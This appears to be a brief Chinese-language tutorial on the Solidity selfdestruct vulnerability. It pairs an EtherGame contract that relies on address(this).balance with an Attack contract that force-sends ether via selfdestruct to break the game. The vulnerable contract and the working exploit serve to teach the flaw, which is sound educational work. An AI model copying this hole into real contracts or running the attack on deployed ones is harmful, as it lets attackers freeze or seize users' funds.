# selfdestruct

### 有一个游戏合约

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract EtherGame {
    uint public targetAmount = 7 ether;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        uint balance = address(this).balance;        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }
    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}
```



### 攻击方的合约

```solidity
contract Attack {
    EtherGame etherGame;

    constructor(EtherGame _etherGame) {
        etherGame = EtherGame(_etherGame);
    }

    function attack() public payable {
                address payable addr = payable(address(etherGame));
        selfdestruct(addr);
    }
```



#### 关键点:  

#### 使用了address(this).balance进行业务逻辑处理，

#### 相当于留了口子给selfdestruct进行自杀式转账攻击